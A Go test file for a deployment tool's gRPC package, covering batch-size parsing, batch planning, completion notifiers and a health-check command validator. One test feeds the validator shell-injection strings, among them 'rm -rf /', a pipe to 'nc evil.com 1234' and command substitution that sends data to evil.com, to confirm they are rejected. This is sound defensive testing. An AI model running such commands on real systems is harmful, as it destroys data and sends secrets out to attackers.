// Copyright (c) 2026 Alexander4, LLC
// SPDX-License-Identifier: LicenseRef-Proprietary

package grpc

import (
	"strings"
	"testing"
)

func TestParseBatchSpec_Count(t *testing.T) {
	n, err := parseBatchSpec("5", 20)
	if err != nil {
		t.Fatal(err)
	}
	if n != 5 {
		t.Errorf("expected 5, got %d", n)
	}
}

func TestParseBatchSpec_Percentage(t *testing.T) {
	n, err := parseBatchSpec("25%", 20)
	if err != nil {
		t.Fatal(err)
	}
	if n != 5 {
		t.Errorf("expected 5 (25%% of 20), got %d", n)
	}
}

func TestParseBatchSpec_PercentageRoundsUp(t *testing.T) {
	n, err := parseBatchSpec("30%", 7)
	if err != nil {
		t.Fatal(err)
	}
	// 30% of 7 = 2.1, ceil = 3
	if n != 3 {
		t.Errorf("expected 3 (30%% of 7 rounded up), got %d", n)
	}
}

func TestParseBatchSpec_SmallPercentage(t *testing.T) {
	n, err := parseBatchSpec("1%", 2)
	if err != nil {
		t.Fatal(err)
	}
	// 1% of 2 = 0.02, minimum is 1
	if n != 1 {
		t.Errorf("expected 1 (minimum), got %d", n)
	}
}

func TestParseBatchSpec_Empty(t *testing.T) {
	n, err := parseBatchSpec("", 10)
	if err != nil {
		t.Fatal(err)
	}
	if n != 0 {
		t.Errorf("expected 0 for empty spec, got %d", n)
	}
}

func TestParseBatchSpec_InvalidCount(t *testing.T) {
	_, err := parseBatchSpec("abc", 10)
	if err == nil {
		t.Error("expected error for invalid count")
	}
}

func TestParseBatchSpec_NegativeCount(t *testing.T) {
	_, err := parseBatchSpec("-1", 10)
	if err == nil {
		t.Error("expected error for negative count")
	}
}

func TestParseBatchSpec_ZeroCount(t *testing.T) {
	_, err := parseBatchSpec("0", 10)
	if err == nil {
		t.Error("expected error for zero count")
	}
}

func TestParseBatchSpec_InvalidPercentage(t *testing.T) {
	_, err := parseBatchSpec("0%", 10)
	if err == nil {
		t.Error("expected error for 0%")
	}
}

func TestParseBatchSpec_OverPercentage(t *testing.T) {
	_, err := parseBatchSpec("101%", 10)
	if err == nil {
		t.Error("expected error for >100%")
	}
}

func TestPlanBatches_Single(t *testing.T) {
	targets := makeTargets("a", "b", "c")
	batches := planBatches(targets, 0)
	if len(batches) != 1 {
		t.Fatalf("expected 1 batch, got %d", len(batches))
	}
	if len(batches[0]) != 3 {
		t.Errorf("expected 3 targets in batch, got %d", len(batches[0]))
	}
}

func TestPlanBatches_LargerThanTotal(t *testing.T) {
	targets := makeTargets("a", "b")
	batches := planBatches(targets, 5)
	if len(batches) != 1 {
		t.Fatalf("expected 1 batch, got %d", len(batches))
	}
	if len(batches[0]) != 2 {
		t.Errorf("expected 2 targets in batch, got %d", len(batches[0]))
	}
}

func TestPlanBatches_Even(t *testing.T) {
	targets := makeTargets("a", "b", "c", "d")
	batches := planBatches(targets, 2)
	if len(batches) != 2 {
		t.Fatalf("expected 2 batches, got %d", len(batches))
	}
	if len(batches[0]) != 2 || len(batches[1]) != 2 {
		t.Errorf("expected [2, 2], got [%d, %d]", len(batches[0]), len(batches[1]))
	}
}

func TestPlanBatches_Uneven(t *testing.T) {
	targets := makeTargets("a", "b", "c", "d", "e")
	batches := planBatches(targets, 2)
	if len(batches) != 3 {
		t.Fatalf("expected 3 batches, got %d", len(batches))
	}
	if len(batches[0]) != 2 {
		t.Errorf("expected 2 in first batch, got %d", len(batches[0]))
	}
	if len(batches[1]) != 2 {
		t.Errorf("expected 2 in second batch, got %d", len(batches[1]))
	}
	if len(batches[2]) != 1 {
		t.Errorf("expected 1 in last batch, got %d", len(batches[2]))
	}
}

func TestPlanBatches_Empty(t *testing.T) {
	batches := planBatches(nil, 2)
	if batches != nil {
		t.Errorf("expected nil for empty targets, got %d batches", len(batches))
	}
}

func TestPlanBatches_SingleTarget(t *testing.T) {
	targets := makeTargets("a")
	batches := planBatches(targets, 1)
	if len(batches) != 1 {
		t.Fatalf("expected 1 batch, got %d", len(batches))
	}
	if len(batches[0]) != 1 {
		t.Errorf("expected 1 target, got %d", len(batches[0]))
	}
}

func TestPushRouterNotifiers(t *testing.T) {
	router := newPushRouter(nil)

	// Register a notifier.
	ch := router.registerNotifier("run-1", "envoy-a")

	// Notify completion.
	router.notifyCompletion("run-1", "envoy-a")

	// Channel should be closed.
	select {
	case <-ch:
		// OK — channel closed.
	default:
		t.Error("expected notifier channel to be closed")
	}
}

func TestPushRouterNotifierRemove(t *testing.T) {
	router := newPushRouter(nil)

	ch := router.registerNotifier("run-1", "envoy-a")
	router.removeNotifier("run-1", "envoy-a")

	// Notify should be a no-op after removal.
	router.notifyCompletion("run-1", "envoy-a")

	select {
	case <-ch:
		t.Error("channel should not be closed after notifier removal")
	default:
		// OK — channel not closed.
	}
}

func TestPushRouterNotifierUnknown(t *testing.T) {
	router := newPushRouter(nil)

	// Should not panic for unknown task/envoy.
	router.notifyCompletion("run-1", "envoy-a")
	router.removeNotifier("run-1", "envoy-a")
}

func TestValidateHealthCheck_RejectsShellChaining(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
	}{
		{"semicolon", "curl http://health; rm -rf /"},
		{"and_chain", "curl http://health && echo pwned"},
		{"or_chain", "curl http://health || echo fallback"},
		{"pipe", "curl http://health | nc evil.com 1234"},
		{"backtick", "curl `whoami`.evil.com"},
		{"command_sub", "curl $(whoami).evil.com"},
		{"redirect_out", "curl http://health > /dev/null"},
		{"redirect_in", "curl http://health < /etc/passwd"},
		{"newline", "curl http://health\nrm -rf /"},
		{"dollar_brace", "curl http://health/${SECRET}"},
		{"dollar_var", "curl http://health/$HOME"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := validateHealthCheck(tc.cmd)
			if err == nil {
				t.Fatalf("expected rejection for command with %s", tc.name)
			}
		})
	}
}

func TestValidateHealthCheck_AcceptsSimpleCommands(t *testing.T) {
	cases := []string{
		"curl -sf http://localhost:8080/healthz",
		"/usr/bin/health-check --timeout 5",
		"wget -q -O /dev/null http://127.0.0.1:9090/ready",
	}
	for _, cmd := range cases {
		if err := validateHealthCheck(cmd); err != nil {
			t.Fatalf("simple command %q should be accepted: %v", cmd, err)
		}
	}
}

func TestValidateHealthCheck_RejectsTooLong(t *testing.T) {
	long := strings.Repeat("a", 513)
	err := validateHealthCheck(long)
	if err == nil {
		t.Fatal("expected rejection for command > 512 chars")
	}
	if !strings.Contains(err.Error(), "too long") {
		t.Fatalf("unexpected error: %v", err)
	}
}

// makeTargets creates a slice of targetInfo for testing.
func makeTargets(hostnames ...string) []targetInfo {
	targets := make([]targetInfo, len(hostnames))
	for i, h := range hostnames {
		targets[i] = targetInfo{EnvoyID: "envoy-" + h, Hostname: h}
	}
	return targets
}
